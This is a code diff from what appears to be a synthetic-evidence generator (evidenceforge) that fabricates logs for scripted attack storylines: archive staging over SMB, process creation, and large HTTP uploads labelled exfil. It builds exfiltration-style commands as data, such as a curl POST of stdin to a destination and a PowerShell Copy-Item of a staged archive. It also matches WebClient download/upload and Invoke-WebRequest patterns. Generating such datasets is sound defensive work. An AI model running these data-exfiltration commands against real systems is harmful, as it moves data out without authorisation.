+        for storyline_event in self.scenario.storyline:
+            if storyline_event.actor != actor.username or storyline_event.system != system.hostname:
+                continue
+            event_time = self._parse_storyline_time(storyline_event.time)
+            event_time = event_time.replace(tzinfo=UTC) if event_time.tzinfo is None else event_time
+            event_time = event_time.astimezone(UTC)
+            if event_time <= after_time:
+                continue
+            if any(spec.type == "logoff" for spec in storyline_event.events):
+                future_logoffs.append(event_time)
+        return min(future_logoffs) if future_logoffs else None
+
+    @staticmethod
+    def _extract_compress_archive_destination(command_line: str) -> str | None:
+        """Extract a PowerShell Compress-Archive destination path."""
+        if "compress-archive" not in command_line.lower():
+            return None
+        match = re.search(
+            r"-DestinationPath\s+(?:\"([^\"]+)\"|'([^']+)'|([^\s;]+))",
+            command_line,
+            re.IGNORECASE,
+        )
+        if not match:
+            return None
+        destination = next(group for group in match.groups() if group)
+        destination = destination.strip().strip("\"'").rstrip(");,")
+        return destination or None
+
+    @staticmethod
+    def _smb_filename_for_staged_archive(system: System, archive_path: str) -> str:
+        """Return a Zeek files.log filename for a staged archive read over SMB."""
+        if archive_path.startswith("\\\\"):
+            return archive_path
+        drive_match = re.match(r"^([A-Za-z]):[\\/](.+)$", archive_path)
+        if drive_match:
+            drive = drive_match.group(1).upper()
+            rest = drive_match.group(2).replace("/", "\\")
+            return f"\\\\{system.hostname}\\{drive}$\\{rest}"
+        normalized = archive_path.replace("/", "\\")
+        normalized = normalized.lstrip("\\")
+        return f"\\\\{system.hostname}\\{normalized}"
+
+    @staticmethod
+    def _local_staging_path_for_archive(
+        actor: User,
+        source_system: System,
+        archive_path: str,
+    ) -> str:
+        """Return the upload-host path that a browser reads after SMB staging."""
+
+        basename = re.split(r"[\\/]+", archive_path.rstrip("\\/"))[-1] or "staged_archive.zip"
+        if _get_os_category(source_system.os) == "windows":
+            return rf"C:\Users\{actor.username}\AppData\Local\Temp\{basename}"
+        home = "/root" if actor.username == "root" else f"/home/{actor.username}"
+        return f"{home}/.cache/{basename}"
+
+    def _storyline_logon_for_process_owner(
+        self,
+        actor: User,
+        system: System,
+        pid: int,
+        at_time: datetime,
+    ) -> str:
+        """Return a reasonable logon ID for a storyline process on a source host."""
+
+        running = self.state_manager.get_process(system.hostname, pid) if pid > 0 else None
+        running_logon_id = getattr(running, "logon_id", "") if running is not None else ""
+        if running_logon_id:
+            return running_logon_id
+        logon_id = self._last_storyline_logon_for_actor_system(actor, system, at_time=at_time)
+        if logon_id:
+            return logon_id
+        sessions = self.state_manager.get_sessions_for_user_at(actor.username, at_time)
+        for session in sessions:
+            if getattr(session, "system", "") == system.hostname:
+                return session.logon_id
+        return "0x3e7"
+
+    def _staged_archive_copy_process(
+        self,
+        *,
+        actor: User,
+        source_system: System | None,
+        source_pid: int,
+        logon_id: str,
+        archive_smb_path: str,
+        local_staging_path: str,
+        exfil_time: datetime,
+        rng: random.Random,
+    ) -> tuple[int, str, str, str, bool]:
+        """Create a short-lived copy process that stages the archive locally."""
+
+        if source_system is None or _get_os_category(source_system.os) != "windows":
+            return source_pid, "", "", "", False
+        process_name = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+        command_line = (
+            "powershell.exe -NoProfile -Command "
+            f"\"Copy-Item -LiteralPath '{archive_smb_path}' "
+            f"-Destination '{local_staging_path}' -Force\""
+        )
+        process_time = exfil_time - timedelta(
+            minutes=rng.randint(5, 8),
+            seconds=rng.randint(5, 55),
+        )
+        parent_resolver = getattr(self.activity_generator, "_resolve_parent", None)
+        parent_pid = 4
+        if callable(parent_resolver):
+            parent_pid = parent_resolver(
+                source_system,
+                actor,
+                process_time,
+                logon_id,
+                process_name,
+            )
+        pid = self.activity_generator.generate_process(
+            user=actor,
+            system=source_system,
+            time=process_time,
+            logon_id=logon_id,
+            process_name=process_name,
+            command_line=command_line,
+            parent_pid=parent_pid,
+            from_storyline=True,
+            suppress_command_file_effect=True,
+            allow_existing_browser_reuse=False,
+            allow_browser_launch_spacing=False,
+        )
+        return pid, process_name, command_line, logon_id, True
+
+    def _record_storyline_staged_archive(
+        self,
+        *,
+        actor: User,
+        system: System,
+        archive_path: str,
+        source_ip: str,
+        staged_at: datetime,
+    ) -> None:
+        """Remember an archive staged on a server by a remote source host."""
+        if not source_ip or not archive_path:
+            return
+        if not hasattr(self, "_storyline_staged_archives"):
+            self._storyline_staged_archives: list[SimpleNamespace] = []
+        self._storyline_staged_archives.append(
+            SimpleNamespace(
+                actor=actor,
+                staging_host=system.hostname,
+                staging_ip=system.ip,
+                source_ip=source_ip,
+                archive_path=archive_path,
+                smb_filename=self._smb_filename_for_staged_archive(system, archive_path),
+                staged_at=staged_at,
+                consumed=False,
+            )
+        )
+
+    def _matching_storyline_staged_archive_for_exfil(
+        self,
+        *,
+        source_ip: str,
+        exfil_time: datetime,
+    ) -> SimpleNamespace | None:
+        """Find the most recent unconsumed staged archive for this exfil source."""
+        archives = getattr(self, "_storyline_staged_archives", [])
+        horizon = timedelta(hours=6)
+        candidates = [
+            archive
+            for archive in archives
+            if not archive.consumed
+            and archive.staged_at <= exfil_time
+            and exfil_time - archive.staged_at <= horizon
+        ]
+        if not candidates:
+            return None
+        exact_source = [archive for archive in candidates if archive.source_ip == source_ip]
+        return max(exact_source or candidates, key=lambda archive: archive.staged_at)
+
+    @staticmethod
+    def _windows_browser_process_for_user_agent(user_agent: str) -> str:
+        """Return a Windows browser image that matches an authored browser User-Agent."""
+        ua = (user_agent or "").lower()
+        if "firefox/" in ua:
+            return r"C:\Program Files\Mozilla Firefox\firefox.exe"
+        if "edg/" in ua or "edge/" in ua:
+            return r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
+        if "chrome/" in ua and "google update" not in ua:
+            return r"C:\Program Files\Google\Chrome\Application\chrome.exe"
+        return ""
+
+    @staticmethod
+    def _windows_browser_command_line(process_name: str, destination: str) -> str:
+        """Return a browser launch command line matching the selected image."""
+        exe = process_name.rsplit("\\", 1)[-1].lower()
+        if exe == "firefox.exe":
+            return f'"{process_name}" -osint -url "{destination}"'
+        if exe == "msedge.exe":
+            return f'"{process_name}" --single-argument "{destination}"'
+        return f'"{process_name}" --profile-directory=Default --new-window "{destination}"'
+
+    @staticmethod
+    def _storyline_http_user_agent_for_process(
+        *,
+        system: System | None,
+        process_image: str | None,
+        command_line: str,
+        rng: random.Random,
+    ) -> str:
+        """Return a source-native HTTP User-Agent for an upload owner process."""
+        image = process_image or ""
+        exe = image.rsplit("\\", 1)[-1].rsplit("/", 1)[-1].lower()
+        command = command_line.lower()
+        if exe in {"curl", "curl.exe"} or command.startswith("curl "):
+            return "curl/7.88.1"
+        if exe in {"wget", "wget.exe"} or command.startswith("wget "):
+            return "Wget/1.21.3"
+        if "python" in exe and "requests" in command:
+            return "python-requests/2.31.0"
+
+        from evidenceforge.generation.activity.proxy_user_agents import (
+            browser_user_agent_for_process,
+        )
+
+        return browser_user_agent_for_process(rng, system, image)
+
+    @staticmethod
+    def _storyline_http_user_agent_for_command(
+        *,
+        system: System | None,
+        process_image: str | None,
+        command_line: str,
+        rng: random.Random,
+    ) -> str:
+        """Return source-native HTTP User-Agent metadata for command-derived HTTP."""
+        user_agent, _ = StorylineMixin._storyline_http_user_agent_metadata_for_command(
+            system=system,
+            process_image=process_image,
+            command_line=command_line,
+            rng=rng,
+        )
+        return user_agent
+
+    @staticmethod
+    def _storyline_http_user_agent_metadata_for_command(
+        *,
+        system: System | None,
+        process_image: str | None,
+        command_line: str,
+        rng: random.Random,
+    ) -> tuple[str, bool]:
+        """Return User-Agent and whether its absence is source-native-known."""
+        explicit_user_agent = StorylineMixin._explicit_http_user_agent_from_command(command_line)
+        if explicit_user_agent is not None:
+            return explicit_user_agent, False
+        if StorylineMixin._command_uses_dotnet_webclient(command_line):
+            return "", True
+        if StorylineMixin._command_uses_powershell_web_cmdlet(command_line):
+            return _POWERSHELL_WEB_CMDLET_USER_AGENT, False
+        return (
+            StorylineMixin._storyline_http_user_agent_for_process(
+                system=system,
+                process_image=process_image,
+                command_line=command_line,
+                rng=rng,
+            ),
+            False,
+        )
+
+    @staticmethod
+    def _explicit_http_user_agent_from_command(command_line: str) -> str | None:
+        """Extract an explicit User-Agent override from raw or decoded command text."""
+        for text in StorylineMixin._http_url_search_texts(command_line):
+            for pattern in _HTTP_USER_AGENT_OVERRIDE_PATTERNS:
+                match = pattern.search(text)
+                if match is None:
+                    continue
+                value = match.group("value").strip()
+                if value:
+                    return value
+        return None
+
+    @staticmethod
+    def _http_request_entity_from_command(command_line: str, request_body_len: int) -> Any | None:
+        """Resolve a curl upload's local and wire-visible entity metadata."""
+
+        if not command_line or "curl" not in command_line.casefold() or request_body_len <= 0:
+            return None
+        try:
+            windows_command = bool(re.search(r"(?:^|\s)[A-Za-z]:\\", command_line))
+            tokens = shlex.split(command_line, posix=not windows_command)
+        except ValueError:
+            return None
+        if any(
+            token in {"-F", "--form", "--form-string"}
+            or token.startswith(("--form=", "--form-string="))
+            for token in tokens
+        ):
+            return None
+        local_path = ""
+        wire_filename = ""
+        encoding = "raw"
+        for index, token in enumerate(tokens):
+            value = tokens[index + 1].strip("\"'") if index + 1 < len(tokens) else ""
+            candidate = ""
+            if token.startswith("--data-binary="):
+                data_value = token.split("=", 1)[1].strip("\"'")
+                candidate = data_value[1:] if data_value.startswith("@") else ""
+            elif token == "--data-binary":
+                candidate = value[1:] if value.startswith("@") else ""
+            elif token.startswith("--upload-file="):
+                candidate = token.split("=", 1)[1].strip("\"'")
+            elif token in {"--upload-file", "-T"}:
+                candidate = value
+            if candidate:
+                if candidate != "-":
+                    local_path = candidate
+                    break
+            if token in {"-F", "--form"} and "@" in value:
+                upload_value = value.split("@", 1)[1]
+                local_path = upload_value.split(";", 1)[0]
+                if local_path == "-":
+                    local_path = ""
+                    continue
+                filename_match = re.search(r"(?:^|;)filename=([^;]+)", upload_value)
+                wire_filename = (
+                    filename_match.group(1).strip("\"'")
+                    if filename_match is not None
+                    else local_path.replace("\\", "/").rsplit("/", 1)[-1]
+                )
+                encoding = "multipart"
+                break
+        if not local_path:
+            return None
+        local_path = local_path.strip("\"'")
+        local_filename = local_path.replace("\\", "/").rsplit("/", 1)[-1]
+        explicit_content_type = ""
+        for index, token in enumerate(tokens):
+            if token not in {"-H", "--header"} or index + 1 >= len(tokens):
+                continue
+            header = tokens[index + 1].strip("\"'")
+            if header.casefold().startswith("content-type:"):
+                explicit_content_type = header.split(":", 1)[1].strip().split(";", 1)[0]
+                break
+        mime_type = explicit_content_type or infer_mime_type_from_path(
+            local_path, "application/octet-stream"
+        )
+        from evidenceforge.events.contexts import HttpRequestEntityContext
+
+        return HttpRequestEntityContext(
+            size=request_body_len,
+            mime_type=mime_type,
+            content_identity=f"local-upload:{local_path}:{request_body_len}:{mime_type}",
+            encoding=encoding,
+            local_source_path=local_path,
+            local_source_filename=local_filename,
+            wire_filename=wire_filename,
+        )
+
+    @staticmethod
+    def _http_request_multipart_from_command(
+        command_line: str,
+        request_body_len: int,
+        *,
+        stable_key: str = "curl-command",
+    ) -> Any | None:
+        """Resolve every curl form argument into one exact multipart request entity."""
+
+        if not command_line or "curl" not in command_line.casefold() or request_body_len <= 0:
+            return None
+        try:
+            windows_command = bool(re.search(r"(?:^|\s)[A-Za-z]:\\", command_line))
+            tokens = shlex.split(command_line, posix=not windows_command)
+        except ValueError:
+            return None
+
+        form_values: list[tuple[str, bool]] = []
+        index = 0
+        while index < len(tokens):
+            token = tokens[index]
+            value = ""
+            literal = False
+            if token in {"-F", "--form", "--form-string"}:
+                if index + 1 >= len(tokens):
+                    raise ValueError(f"curl {token} requires a form argument")
+                value = tokens[index + 1]
+                literal = token == "--form-string"
+                index += 2
+            elif token.startswith("--form="):
+                value = token.split("=", 1)[1]
+                index += 1
+            elif token.startswith("--form-string="):
+                value = token.split("=", 1)[1]
+                literal = True
+                index += 1
+            elif token.startswith("-F") and len(token) > 2:
+                value = token[2:]
+                index += 1
+            else:
+                index += 1
+                continue
+            form_values.append((value, literal))
+        if not form_values:
+            return None
+
+        from evidenceforge.generation.activity.http_multipart import (
+            build_http_multipart_context,
+        )
+        from evidenceforge.models.http import HttpMultipartEntitySpec
+
+        parts: list[dict[str, Any]] = []
+        for raw_value, force_literal in form_values:
+            if "=" not in raw_value:
+                raise ValueError(f"curl form argument requires name=value: {raw_value!r}")
+            name, form_value = raw_value.split("=", 1)
+            if not name:
+                raise ValueError("HTTP multipart form field names must not be empty")
+            if force_literal:
+                parts.append({"name": name, "value": form_value})
+                continue
+
+            segments = form_value.split(";")
+            content = segments[0]
+            modifiers: dict[str, str] = {}
+            for segment in segments[1:]:
+                if "=" not in segment:
+                    continue
+                key, modifier_value = segment.split("=", 1)
+                modifiers[key.casefold()] = modifier_value.strip("\"'")
+            if content.startswith(("@", "<")):
+                file_mode = content[0]
+                local_path = content[1:].strip("\"'")
+                if not local_path or local_path == "-":
+                    raise ValueError(
+                        "curl multipart stdin requires an explicit authored multipart size"
+                    )
+                filename = modifiers.get("filename", "")
+                if file_mode == "@" and not filename:
+                    filename = local_path.replace("\\", "/").rsplit("/", 1)[-1]
+                part: dict[str, Any] = {
+                    "name": name,
+                    "local_source_path": local_path,
+                    "filename": filename or None,
+                    "content_type": modifiers.get("type") or None,
+                    "transfer_encoding": modifiers.get("encoder", "binary"),
+                }
+                parts.append({key: value for key, value in part.items() if value is not None})
+            else:
+                part = {
+                    "name": name,
+                    "value": content,
+                    "content_type": modifiers.get("type") or None,
+                    "transfer_encoding": modifiers.get("encoder", "binary"),
+                }
+                parts.append({key: value for key, value in part.items() if value is not None})
+
+        spec = HttpMultipartEntitySpec.model_validate(
+            {"media_type": "multipart/form-data", "parts": parts}
+        )
+        return build_http_multipart_context(
+            spec,
+            stable_key=stable_key,
+            client_family="curl",
+            asserted_body_len=request_body_len,
+        )
+
+    def _emit_http_upload_file_read(
+        self,
+        *,
+        actor: User,
+        system: System | None,
+        pid: int,
+        process_image: str,
+        command_line: str,
+        entity: Any,
+        connection_time: datetime,
+    ) -> None:
+        """Emit endpoint evidence only when an HTTP body resolves to a local file."""
+
+        if system is None or pid <= 0 or not entity.local_source_path:
+            return
+        from evidenceforge.events.base import OccurrenceBuilder
+        from evidenceforge.events.contexts import AuthContext, FileContext, ProcessContext
+
+        running = self.state_manager.get_process(system.hostname, pid)
+        read_time = connection_time - timedelta(milliseconds=120)
+        if running is not None:
+            read_time = max(read_time, running.start_time + timedelta(milliseconds=1))
+        local_username = running.username if running is not None else actor.username
+        self.dispatcher.dispatch_builder(
+            OccurrenceBuilder(
+                timestamp=read_time,
+                event_type="file_read",
+                src_host=self.activity_generator._build_host_context(system),
+                auth=AuthContext(username=local_username),
+                process=ProcessContext(
+                    pid=pid,
+                    parent_pid=running.parent_pid if running is not None else 0,
+                    image=process_image,
+                    command_line=command_line,
+                    username=local_username,
+                    logon_id=running.logon_id if running is not None else "",
+                    start_time=running.start_time if running is not None else None,
+                ),
+                file=FileContext(path=entity.local_source_path, action="read", pid=pid),
+                storyline_origin=True,
+            )
+        )
+
+    @staticmethod
+    def _validate_multipart_command_agreement(authored: Any, command: Any) -> None:
+        """Require an explicit multipart entity and correlated curl form to describe one body."""
+
+        authored_parts = authored.leaf_parts()
+        command_parts = command.leaf_parts()
+        if len(authored_parts) != len(command_parts):
+            raise ValueError(
+                "explicit request_multipart and correlated curl form must have the same part count"
+            )
+        for index, (expected, observed) in enumerate(
+            zip(authored_parts, command_parts, strict=True)
+        ):
+            if (
+                expected.local_source_path != observed.local_source_path
+                or expected.wire_filename != observed.wire_filename
+            ):
+                raise ValueError(
+                    "explicit request_multipart disagrees with correlated curl form at part "
+                    f"{index}"
+                )
+
+    def _emit_http_multipart_file_reads(
+        self,
+        *,
+        actor: User,
+        system: System | None,
+        pid: int,
+        process_image: str,
+        command_line: str,
+        multipart: Any,
+        connection_time: datetime,
+    ) -> None:
+        """Emit ordered endpoint reads for multipart leaves backed by local files."""
+
+        for index, part in enumerate(multipart.leaf_parts() if multipart is not None else ()):
+            if not part.local_source_path:
+                continue
+            self._emit_http_upload_file_read(
+                actor=actor,
+                system=system,
+                pid=pid,
+                process_image=process_image,
+                command_line=command_line,
+                entity=part,
+                connection_time=connection_time - timedelta(milliseconds=index),
+            )
+
+    @staticmethod
+    def _command_uses_dotnet_webclient(command_line: str) -> bool:
+        """Return true for raw System.Net.WebClient download commands."""
+        for text in StorylineMixin._http_url_search_texts(command_line):
+            lowered = text.lower()
+            if "webclient" not in lowered:
+                continue
+            if any(
+                token in lowered
+                for token in (
+                    ".downloadstring",
+                    ".downloadfile",
+                    ".openread",
+                    ".uploaddata",
+                    ".uploadfile",
+                )
+            ):
+                return True
+        return False
+
+    @staticmethod
+    def _command_uses_powershell_web_cmdlet(command_line: str) -> bool:
+        """Return true for PowerShell web cmdlets that set a native default UA."""
+        for text in StorylineMixin._http_url_search_texts(command_line):
+            lowered = text.lower()
+            if "invoke-webrequest" in lowered or "invoke-restmethod" in lowered:
+                return True
+            if re.search(r"(?i)\b(?:iwr|irm)\b", text):
+                return True
+        return False
+
+    def _emit_storyline_archive_transfer_before_exfil(
+        self,
+        *,
+        actor: User,
+        source_ip: str,
+        exfil_time: datetime,
+        upload_bytes: int,
+        source_pid: int,
+        source_process: str,
+        source_command: str,
+        rng: random.Random,
+    ) -> None:
+        """Emit the SMB read that moves a staged archive to the upload host."""
+        if upload_bytes < 1_000_000:
+            return
+        archive = self._matching_storyline_staged_archive_for_exfil(
+            source_ip=source_ip,
+            exfil_time=exfil_time,
+        )
+        if archive is None:
+            return
+        target_system = self._system_for_ip(archive.staging_ip)
+        if target_system is None:
+            return
+        source_system = self._system_for_ip(source_ip)
+        source_file_read_path = archive.smb_filename
+        transfer_pid = source_pid
+        transfer_process = source_process
+        transfer_command = source_command
+        transfer_logon_id = ""
+        transfer_actor = actor
+        terminate_transfer_process = False
+        if source_system is not None:
+            transfer_logon_id = self._storyline_logon_for_process_owner(
+                actor,
+                source_system,
+                source_pid,
+                exfil_time,
+            )
+            transfer_actor = self._storyline_local_process_actor_for_logon(
+                actor,
+                source_system,
+                transfer_logon_id,
+            )
+            source_file_read_path = self._local_staging_path_for_archive(
+                transfer_actor,
+                source_system,
+                archive.archive_path,
+            )
+            (
+                transfer_pid,
+                transfer_process,
+                transfer_command,
+                transfer_logon_id,
+                terminate_transfer_process,
+            ) = self._staged_archive_copy_process(
+                actor=transfer_actor,
+                source_system=source_system,
+                source_pid=source_pid,
+                logon_id=transfer_logon_id,
+                archive_smb_path=archive.smb_filename,
+                local_staging_path=source_file_read_path,
+                exfil_time=exfil_time,
+                rng=rng,
+            )
+        emitted = StagedArchiveSmbReadActionBundle(
+            self,
+            StagedArchiveSmbReadRequest(
+                actor=transfer_actor,
+                smb_principal=actor.username,
+                source_ip=source_ip,
+                staging_ip=archive.staging_ip,
+                archive_path=archive.archive_path,
+                smb_filename=archive.smb_filename,
+                staged_at=archive.staged_at,
+                exfil_time=exfil_time,
+                upload_bytes=upload_bytes,
+                source_system=source_system,
+                target_system=target_system,
+                source_pid=transfer_pid,
+                source_process=transfer_process,
+                source_command=transfer_command,
+                source_logon_id=transfer_logon_id,
+                terminate_source_process=terminate_transfer_process,
+                reader_pid=source_pid,
+                reader_process=source_process,
+                reader_command=source_command,
+                source_file_read_path=source_file_read_path,
+            ),
+            rng,
+        ).execute()
+        if emitted:
+            archive.consumed = True
+
+    def _ensure_storyline_upload_process_for_exfil(
+        self,
+        *,
+        actor: User,
+        system: System | None,
+        time: datetime,
+        spec: ConnectionEventSpec,
+        current_pid: int,
+        current_image: str | None,
+        rng: random.Random,
+    ) -> tuple[int, str | None, str]:
+        """Return a source process suitable for a large HTTP upload."""
+
+        if system is None:
+            return current_pid, current_image, current_image or ""
+
+        running = (
+            self.state_manager.get_process(system.hostname, current_pid)
+            if current_pid > 0
+            else None
+        )
+        current_command = running.command_line if running is not None else current_image or ""
+        image_name = (current_image or "").rsplit("\\", 1)[-1].rsplit("/", 1)[-1].lower()
+        expected_windows_browser = (
+            self._windows_browser_process_for_user_agent(spec.user_agent or "")
+            if _get_os_category(system.os) == "windows"
+            else ""
+        )
+        multipart_requires_exact_owner = getattr(spec, "request_multipart", None) is not None
+        if (
+            running is not None
+            and multipart_requires_exact_owner
+            and _process_owns_storyline_multipart_upload(
+                running, current_image or running.image, spec
+            )
+        ):
+            return current_pid, current_image, current_command
+        if (
+            not multipart_requires_exact_owner
+            and image_name
+            in {
+                "chrome.exe",
+                "msedge.exe",
+                "firefox.exe",
+                "curl",
+                "curl.exe",
+            }
+            and (
+                not expected_windows_browser
+                or (current_image or "").lower() == expected_windows_browser.lower()
+            )
+        ):
+            return current_pid, current_image, current_command
+
+        if multipart_requires_exact_owner:
+            matching_processes = [
+                process
+                for process in self.state_manager.get_processes_on_system(system.hostname)
+                if ensure_utc(process.start_time) <= ensure_utc(time)
+                and _process_owns_storyline_multipart_upload(process, process.image, spec)
+            ]
+            if matching_processes:
+                exact_owner = max(matching_processes, key=lambda process: process.start_time)
+                return exact_owner.pid, exact_owner.image, exact_owner.command_line
+
+        os_category = _get_os_category(system.os)
+        scheme = "https" if spec.dst_port == 443 else "http"
+        host = spec.hostname or spec.dst_ip
+        uri = spec.uri or "/"
+        destination = (
+            uri if re.match(r"^https?://", uri, re.IGNORECASE) else f"{scheme}://{host}{uri}"
+        )
+        if os_category == "windows":
+            process_name = (
+                expected_windows_browser or r"C:\Program Files\Google\Chrome\Application\chrome.exe"
+            )
+            command_line = self._windows_browser_command_line(process_name, destination)
+        else:
+            process_name = "/usr/bin/curl"
+            method = spec.method or "POST"
+            command_line = f"curl -fsS -X {method} --data-binary @- {destination}"
+
+        process_time = time - timedelta(
+            minutes=rng.randint(3, 6),
+            seconds=rng.randint(5, 55),
+        )
+        logon_id = self._last_storyline_logon_for_actor_system(
+            actor,
+            system,
+            at_time=process_time,
+        )
+        if logon_id is None:
+            logon_id = self.activity_generator.generate_logon(
+                user=actor,
+                system=system,
+                time=process_time - timedelta(seconds=rng.uniform(0.5, 2.0)),
+                logon_type=2,
+            )
+            self._record_storyline_logon(actor, system, logon_id)
+        parent_pid = self.activity_generator._resolve_parent(
+            system,
+            actor,
+            process_time,
+            logon_id,
+            process_name,
+            command_line,
+        )
+        pid = self.activity_generator.generate_process(
+            user=actor,
+            system=system,
+            time=process_time,
+            logon_id=logon_id,
+            process_name=process_name,
+            command_line=command_line,
+            parent_pid=parent_pid,
+            ensure_file_event=False,
+            from_storyline=True,
+        )
+        self.activity_generator._record_user_process(system, actor, pid, process_name)
+        self._record_last_storyline_process(system, pid, process_name, command_line)
+        return pid, process_name, command_line
+
+    def _last_storyline_process_for_system(
+        self,
+        system: System | None,
+        actor: User | None = None,
+    ) -> tuple[int, str | None]:
+        """Return the last live storyline process for the same source host."""
+        if system is None:
+            return -1, None
+        processes = getattr(self, "_last_storyline_process_by_system", {})
+        pid, image = processes.get(system.hostname, (-1, ""))
+        if pid <= 0 or not image:
+            return self._latest_live_storyline_process_ref_for_system(system, actor=actor)
+
+        os_category = _get_os_category(system.os)
+        if os_category == "windows" and image.startswith("/"):
+            return -1, None
+        if os_category == "linux" and re.match(r"^[A-Za-z]:\\", image):
+            return -1, None
+        process = self.state_manager.get_process(system.hostname, pid)
+        if process is None:
+            processes.pop(system.hostname, None)
+            if getattr(self, "_last_storyline_system", None) == system.hostname:
+                self._last_storyline_pid = -1
+                self._last_storyline_image = ""
+                self._last_storyline_system = ""
+            return self._latest_live_storyline_process_ref_for_system(system, actor=actor)
+        if actor is not None and process.username.casefold() != actor.username.casefold():
+            return self._latest_live_storyline_process_ref_for_system(system, actor=actor)
+        return pid, image
+
+    def _latest_live_storyline_process_ref_for_system(
+        self,
+        system: System,
+        *,
+        actor: User | None = None,
+    ) -> tuple[int, str | None]:
+        """Return the newest live named process when an unreferenced process has ended."""
+
+        refs = getattr(self, "_storyline_process_refs", {})
+        for key, (pid, image) in reversed(tuple(refs.items())):
+            hostname, _username, _process_ref = key
+            if hostname != system.hostname or (
+                actor is not None and _username.casefold() != actor.username.casefold()
+            ):
+                continue
+            process = self.state_manager.get_process(system.hostname, pid)
+            if process is not None and process.image == image:
+                return pid, image
+            refs.pop(key, None)
+        return -1, None
+
+    def _clamp_after_storyline_process_source_create(
+        self,
+        *,
+        system: System | None,
+        pid: int,
+        network_time: datetime,
+        rng: random.Random,
+    ) -> datetime:
+        """Keep process-owned storyline network evidence after visible process creation."""
+        if system is None or pid <= 0:
+            return network_time
+        source_time_getter = getattr(self.activity_generator, "process_source_create_bound", None)
+        if not callable(source_time_getter):
+            return network_time
+        process_source_time = source_time_getter(system, pid)
+        if not isinstance(process_source_time, datetime) or network_time > process_source_time:
+            return network_time
+        return process_source_time + timedelta(milliseconds=rng.randint(120, 700))
+
+    def _clamp_after_recent_storyline_process_source_create(
+        self,
+        *,
+        system: System | None,
+        event_time: datetime,
+        rng: random.Random,
+    ) -> datetime:
+        """Keep storyline effects after the last visible source process creation."""
+        if system is None:
+            return event_time
+        pid, _image = self._last_storyline_process_for_system(system)
+        return self._clamp_after_storyline_process_source_create(
+            system=system,
+            pid=pid,
+            network_time=event_time,
+            rng=rng,
+        )
+
+    def _emit_linux_storyline_shell_friction(
+        self,
+        *,
+        actor: User,
+        system: System,
+        time: datetime,
+        process_name: str,
+        command_line: str,
+        output_file: str | None,
+        rng: random.Random,
+    ) -> datetime | None:
+        """Emit bounded bash-history texture before an authored Linux process."""
+        commands = _linux_storyline_shell_friction_commands(
+            username=actor.username,
+            process_name=process_name,
+            command_line=command_line,
+            output_file=output_file,
+            rng=rng,
+        )
+        if not commands:
+            return None
+
+        lead_seconds = max(18.0, len(commands) * rng.uniform(8.0, 18.0)) + rng.uniform(
+            5.0,
+            35.0,
+        )
+        first_anchor = time - timedelta(seconds=lead_seconds)
+        spacing_seconds = lead_seconds / (len(commands) + 1)
+        latest_scheduled: datetime | None = None
+        for command_index, command in enumerate(commands):
+            scheduled = first_anchor + timedelta(seconds=spacing_seconds * (command_index + 1))
+            prepared_command = self.activity_generator._prepare_bash_history_command(
+                system,
+                command,
+            )
+            self.activity_generator._emit_bash_command_event(
+                actor,
+                system,
+                scheduled,
+                prepared_command,
+            )
+            latest_scheduled = scheduled
+        return latest_scheduled
+
+    def _recent_storyline_process_logon_id(
+        self,
+        actor: User,
+        system: System,
+        time: datetime,
+        *,
+        executable: str | None = None,
+    ) -> str | None:
+        """Return a recent storyline process LogonID for this actor and host."""
+        pid, image = self._last_storyline_process_for_system(system)
+        if pid <= 0 or not image:
+            return None
+        if executable:
+            image_name = image.rsplit("\\", 1)[-1].rsplit("/", 1)[-1].lower()
+            if image_name != executable.lower():
+                return None
+        proc = self.state_manager.get_process(system.hostname, pid)
+        if proc is None or proc.username != actor.username or not proc.logon_id:
+            return None
+        session = self.state_manager.get_session(proc.logon_id)
+        if (
+            session is None
+            or session.username != actor.username
+            or session.system != system.hostname
+        ):
+            return None
+        if proc.start_time is None or proc.start_time > time:
+            return None
+        if time - proc.start_time > timedelta(minutes=5):
+            return None
+        return proc.logon_id
+
+    def _queue_story_process_termination(
+        self,
+        *,
+        actor: User,
+        system: System,
+        time: datetime,
+        pid: int,
+        process_name: str,
+        logon_id: str,
+        release_storyline_index: int | None = None,
+    ) -> None:
+        """Defer termination until same-step and cross-step authored dependents run."""
+        if not hasattr(self, "_pending_story_process_terminations"):
+            self._pending_story_process_terminations = []
+        self._pending_story_process_terminations.append(
+            {
+                "actor": actor.username,
+                "system": system.hostname,
+                "time": time,
+                "pid": pid,
+                "process_name": process_name,
+                "logon_id": logon_id,
+                "release_storyline_index": release_storyline_index,
+            }
+        )
+
+    def _flush_story_process_terminations(
+        self,
+        *,
+        completed_storyline_index: int | None = None,
+        release_time: datetime | None = None,
+    ) -> None:
+        """Emit due terminations while retaining processes needed by later authored work."""
+        pending = getattr(self, "_pending_story_process_terminations", [])
+        if not pending:
+            return
+        retained: list[dict[str, Any]] = []
+        for item in pending:
+            required_index = item.get("release_storyline_index")
+            if (
+                required_index is not None
+                and completed_storyline_index is not None
+                and completed_storyline_index < required_index
+            ):
+                retained.append(item)
+                continue
+            find_system = getattr(self, "_find_system", None)
+            system = find_system(item["system"]) if callable(find_system) else None
+            if system is None:
+                system = next(
+                    (
+                        candidate
+                        for candidate in self.scenario.environment.systems
+                        if candidate.hostname == item["system"]
+                    ),
+                    None,
+                )
+            find_actor = getattr(self, "_find_actor", None)
+            actor = find_actor(item["actor"]) if callable(find_actor) else None
+            if actor is None:
+                actor = next(
+                    (
+                        candidate
+                        for candidate in self.scenario.environment.users
+                        if candidate.username == item["actor"]
+                    ),
+                    None,
+                )
+            if actor is None:
+                user_model = getattr(self.activity_generator, "_user_model_for_username", None)
+                actor = user_model(item["actor"]) if callable(user_model) else None
+            if system is None or actor is None:
+                raise StateError(
+                    "Deferred storyline process termination lost its actor or system identity"
+                )
+            proc = self.state_manager.get_process(system.hostname, item["pid"])
+            if proc is None:
+                continue
+            termination_time = item["time"]
+            if release_time is not None:
+                termination_time = max(
+                    termination_time,
+                    ensure_utc(release_time) + timedelta(milliseconds=1),
+                )
+            self.activity_generator.generate_process_termination(
+                user=actor,
+                system=system,
+                time=termination_time,
+                pid=item["pid"],
+                process_name=item["process_name"],
+                logon_id=item["logon_id"],
+                from_storyline=True,
+            )
+        self._pending_story_process_terminations = retained
+
+    def _record_storyline_group_completion(
+        self,
+        *,
+        actor: User,
+        system: System,
+        time: datetime,
+    ) -> None:
+        """Preserve authored group order after independent deterministic jitter."""
+
+        key = self._storyline_host_actor_key(system, actor)
+        available = getattr(self, "_storyline_host_available_at", {})
+        available[key] = max(time, available.get(key, time))
+        self._storyline_host_available_at = available
+
